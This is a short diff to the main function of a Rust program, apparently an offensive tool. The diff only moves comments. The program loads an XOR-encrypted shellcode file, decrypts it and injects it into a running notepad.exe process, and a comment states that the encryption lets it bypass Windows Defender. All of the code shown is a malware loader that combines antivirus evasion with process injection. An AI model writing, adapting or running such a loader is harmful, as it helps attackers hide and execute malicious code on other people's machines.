@@ -22,10 +22,12 @@ const SHELL_CODE: &[u8] = include_bytes!("YOUR_PAYLOAD.bin");
 const KEY: u8 = 0x42;
 
 fn main() {
-    let payload = XorCypher::<Shellcode>::from_encrypted(SHELL_CODE, KEY); // The payload is encrypted one time using  XorCypher -> Allows for bypassing windows defender on my machine
-
-    let process = find_process("notepad.exe").expect("Target process not found"); // Find a process with the name "notepad.exe"
-    if let Err(e) = inject(process, payload) { // Inject the payload
+    // The payload is encrypted one time using XorCypher
+    // -> Allows for bypassing windows defender on my machine
+    let payload = XorCypher::<Shellcode>::from_encrypted(SHELL_CODE, KEY);
+    
+    let process = find_process("notepad.exe").expect("Target process not found");
+    if let Err(e) = inject(process, payload) {
         println!("Could not inject payload: {}", e);
     }
 }
